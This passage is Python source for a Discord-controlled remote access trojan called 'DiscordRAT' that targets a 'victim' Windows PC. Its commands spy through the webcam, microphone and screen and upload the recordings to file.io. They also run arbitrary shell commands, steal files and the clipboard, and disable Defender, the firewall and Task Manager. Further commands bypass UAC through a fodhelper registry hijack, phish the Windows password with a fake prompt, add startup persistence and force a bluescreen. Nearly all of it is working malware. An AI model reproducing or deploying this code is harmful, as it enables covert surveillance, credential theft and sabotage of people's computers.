            await ctx.send("Screen recording sent successfully", file=file)
            os.system(r"del %temp%\output.avi /f")


#Record audio
@slash.slash(name="Recordaudio", description="Records Audio of the user for the given time", guild_ids=g)
async def RecordAudio_command(ctx: SlashContext,time):
    if ctx.channel.name == channel_name:
        await ctx.send("Recording audio...")
        seconds = float(time)
        temp = (os.getenv('TEMP'))
        fs = 44100
        laco = temp + r"\output.wav"
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(laco, fs, myrecording)
        temp = (os.getenv('TEMP'))
        check = temp + r"\output.wav"
        check2 = os.stat(check).st_size
        if check2 > 7340032:
            instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
            await ctx.send("this may take some time becuase it is over 8 MB. please wait")
            string = subprocess.getoutput(instruction)
            import re
            output = re.search("key", string).start()
            output = output + 6
            output2 = output + 12
            boom = string[output:output2]   
            boom = r"https://file.io/" + boom
            await ctx.send("video download link: " + boom)
            await ctx.send("[*] Command successfuly executed")
            os.system(r"del %temp%\output.wav /f")
        else:
            file = discord.File(check, filename="output.wav")
            await ctx.send("[*] Command successfuly executed", file=file)
            os.system(r"del %temp%\output.wav /f")


#webcam
@slash.slash(name="webcam", description="takes a pic of their webcam", guild_ids=g)
async def webcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Finding a perfect frame. . .")
        temp = (os.getenv('TEMP'))
        camera_port = 0
        camera = cv2.VideoCapture(camera_port)
        #time.sleep(0.1)
        return_value, image = camera.read()
        cv2.imwrite(temp + r"\temp.png", image)
        del(camera)
        file = discord.File(temp + r"\temp.png", filename="temp.png")
        await ctx.channel.send("[*] Command successfuly executed", file=file)


#Record Webcam
@slash.slash(name="RecordWebcam", description="Records Webcam video of the user for the given time", guild_ids=g)
async def RecordWebcam_command(ctx: SlashContext,time):
    if ctx.channel.name == channel_name:
        await ctx.send("Recording webcam...")
        input1 = float(time)
        temp = (os.getenv('TEMP'))
        vid_capture = cv2.VideoCapture(0)
        vid_cod = cv2.VideoWriter_fourcc(*'XVID')
        loco = temp + r"\output.mp4"
        output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
        input2 = 0
        while True:
            input2 = input2 + 1
            input3 = 0.045 * input2
            ret,frame = vid_capture.read()
            output.write(frame)
            if input3 >= input1:
                break
            else:
                continue
        vid_capture.release()
        output.release()
        temp = (os.getenv('TEMP'))
        check = temp + r"\output.mp4"
        check2 = os.stat(check).st_size
        if check2 > 7340032:
            instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
            await ctx.send("this may take some time becuase it is over 8 MB. please wait")
            string = subprocess.getoutput(instruction)
            output = re.search("key", string).start()
            output = output + 6
            output2 = output + 12
            boom = string[output:output2]   
            boom = r"https://file.io/" + boom
            await ctx.send("video download link: " + boom)
            await ctx.send("Victim caught in 4k")
            os.system(r"del %temp%\output.mp4 /f")
        else:
            file = discord.File(check, filename="output.mp4")
            await ctx.send("Victim caught in 4k", file=file)
            os.system(r"del %temp%\output.mp4 /f")



#changedirectory
@slash.slash(name="cd", description="change directory", guild_ids=g)
async def Changedirectory_command(ctx: SlashContext,dir):
    if ctx.channel.name == channel_name:
        import os
        os.chdir(dir)
        await ctx.send("Diectory changed to " + dir)


#viewdirectory
@slash.slash(name="viewdirectory", description="view the items in the directory", guild_ids=g)
async def Viewdirectory_command(ctx: SlashContext, dire="null"):
    if ctx.channel.name == channel_name:
        if dire == "null":
            dire = os.getcwd()
            subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            os.chdir(dire)
            subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        file = discord.File(
            os.path.join(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt"), filename="Directory.txt"
        )
        await ctx.send("Contents of dir " + dire + " are:", file=file)
        os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt")
        os.chdir(ogdir)


#download
@slash.slash(name="Download", description="Download files from victim", guild_ids=g)
async def Download_command(ctx: SlashContext, filepath):
    if ctx.channel.name == channel_name:
        filename=filepath
        check2 = os.stat(filename).st_size
        if check2 > 7340032:
            instruction = """curl -F file=@""" + '"' + filename + '"' + """ https://file.io/?expires=1w"""
            await ctx.send("this may take some time becuase it is over 8 MB. please wait")
            string = subprocess.getoutput(instruction)
            import re
            output = re.search("key", string).start()
            output = output + 6
            output2 = output + 12
            boom = string[output:output2]
            boom = r"https://file.io/" + boom
            await ctx.send("download link: " + boom)
            await ctx.send("Here is your file")
        else:
            file = discord.File(filepath, filename=filepath)
            await ctx.send("Here is your file", file=file)

   

#maxvolume
@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


#maxvolume
@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


#Wallpaper
@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await ctx.send(f"Successfully Changed their wallpaper to:\n{link}")
            else:
                await ctx.send("Link needs to be a url to an image!")
        else:
            await ctx.send("Invalid link!")



@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return output

        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        sleep(1)
        shel._running = False

        result = str(shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc
        numb = len(result)

        if result != "":
            if numb < 1:
                await ctx.send("unrecognized command or no output was obtained")
            elif numb > 1990:
                f1 = open("output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File("output.txt", filename="output.txt")

                await ctx.send("Command successfully executed", file=file)
                os.remove("output.txt")
            else:
                await ctx.send(f"Command successfully executed:\n```\n{result}```")
        else:
            await ctx.send("unrecognized command or no output was obtained")

@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Typing. . .")
        if message == "enter":
            pyautogui.press("enter")
        else:
            pyautogui.typewrite(message)
        await ctx.send(f"Done typing\n```\n{message}```")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"Their Current Clipboard is:\n```{data}```")


@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_int),
            ]
        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Error", value="Errors", emoji="🚫"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Info", value="Infos", emoji="❕"),
            create_select_option(label="Question", value="Questions", emoji="❔"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")


#Displayoff
@slash.slash(name="Displayoff", description="Turns off their monitor", guild_ids=g)
async def Displayoff_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            from pynput.keyboard import Key, Controller
            keyboard = Controller()
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("Display turned off, Victim is blind")
        else:
            await ctx.send("Failed, Admin rights are required for this operation")

#Display on
@slash.slash(name="Displayon", description="Turns on their monitor", guild_ids=g)
async def Displayon_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            from pynput.keyboard import Key, Controller
            keyboard = Controller()
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("Command executed sucessfully")
        else:
            await ctx.send("You are not a Admin :(")


#DisableAntivirus
@slash.slash(name="DisableAntiVirus", description="Disable Anti-Virus in victims pc", guild_ids=g)
async def DisableAntiVirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Trying to disable. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:            
            import subprocess
            instruction = """ REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            result = str(shell().stdout.decode('CP437'))
            done = result.split()
            boom = done[2:]
            if boom <= ['17763']:
                os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                await ctx.send("Windows Anti virus disabled")
            elif boom >= ['18362']:
                os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                await ctx.send("Windows Anti virus disabled")
            else:
                await ctx.send("An unknown error has occurred")     
        else:
            await ctx.send("You are not a Administrator :( ")


#DisableFirewall
@slash.slash(name="DisableFirewall", description="Disable Firewall in victims pc", guild_ids=g)
async def DisableFirewall_command(ctx: SlashContext):   
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            os.system(r"NetSh Advfirewall set allprofiles state off")
            await ctx.send("Firewall disabled")
        else:
            await ctx.send("You are not a Administrator :(")


#Website
@slash.slash(name="Website", description="Opens up a website in victims computer", guild_ids=g)
async def DisableFirewall_command(ctx: SlashContext,website: str):  
    if ctx.channel.name == channel_name:
        def OpenBrowser(URL):
            if not URL.startswith('http'):
                URL = 'http://' + URL
            subprocess.call('start ' + URL, shell=True) 
        OpenBrowser(website)
        await ctx.send("Opened " + website + " sucessfully")
    

#plays audio from a yt link
@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
            await ctx.send("Invalid Youtube Link")


#Stops audio 
@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        ctx.send("stopped the music")
        os.system(f"taskkill /F /IM {pid_process[1]}")


@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
async def AdminForce_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"attempting to get admin privileges. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == False:
            os.system("""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force""")
            os.system("""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force""") 
            os.system("""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start""" + sys.argv[0] +"-Force")
            
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            with disable_fsr():
                os.system("fodhelper.exe")

            sleep(2)
            os.system("""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force""")
        else:
            await ctx.send("You already have admin privileges")

@slash.slash(name="Windowspass", description="Get Windows passoword by phishing attack", guild_ids=g)
async def Windowspass_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Launching phishing attack..")
        cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        cmd92 = 'echo $cred.getnetworkcredential().password;'
        full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
        instruction = full_cmd
        def shell():   
            output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        result = str(shell().stdout.decode('CP437'))
        await ctx.send("User has typed in a passoword. Extracting...")
        await ctx.send("password user typed in is: " + result)



#lists all process in victims pc
@slash.slash(name="Listprocess", description="Lists the process happening at victims computer", guild_ids=g)
async def ListProcess_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run("tasklist", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global statusus
            statusus = "ok"
            return output
        import threading
        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        time.sleep(1)
        shel._running = False
        if statusus:
            result = str(shell().stdout.decode('CP437'))
            numb = len(result)
            if numb < 1:
                await ctx.send("Command not recognized or no output was obtained")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\output.txt"):
                    os.system(r"del %temp%\output.txt /f")
                f1 = open(temp + r"\output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\output.txt", filename="output.txt")
                await ctx.send("Extracting Process list", file=file)
            else:
                await ctx.send("Extracting Process list : " + result)


#disable task manager
@slash.slash(name="DisableTaskmanager", description="Disables taskmanager", guild_ids=g)
async def DisableTaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            global statuuusss
            import time
            statuuusss = None
            import subprocess
            import os
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                statuuusss = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                import winreg as reg
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                import os
                os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
            else:
                import os
                os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
            await ctx.send("Disabled Taskmanager")
        else:
                await ctx.send("You are not an Admin :(")


#enable Taskmanager
@slash.slash(name="EnableTaskmanager", description="Reenables taskmanager", guild_ids=g)
async def EnableTaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statusuusss
                import time
                statusuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statusuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    await ctx.send("ReEnabled Taskmanager sucessfully")  
                else:
                    import winreg as reg
                    reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    await ctx.send("ReEnabled Taskmanager sucessfully")
        else:
            await ctx.send("You are not an Admin :(")



@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext, reg_name: str):
    if ctx.channel.name == channel_name:
        try:
            key1 = winreg.HKEY_CURRENT_USER
            key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
            open_.Close()
            await ctx.send("Successfully added it to `run` startup")
        except PermissionError:
            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
            await ctx.send("Permission was denied, added it to `startup folder` instead")


#Shutdown pc
@slash.slash(name="Shutdown", description="Shutdowns victim's pc", guild_ids=g)
async def Shutdown_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        uncritproc()
        os.system("shutdown /p")
        await ctx.send("Pc is shut down")

#Bluescreen pc
@slash.slash(name="Bluescreen", description="Kills pc litrally", guild_ids=g)
async def Bluescreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes.wintypes
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="❌"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to bluescreen victims pc?", components=[action_row])
        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            await ctx.send(content="Bluescreened victims pc", hidden=True)
        else:
            await ctx.send(content="*phew* that was close", hidden=True)




client.run(token)
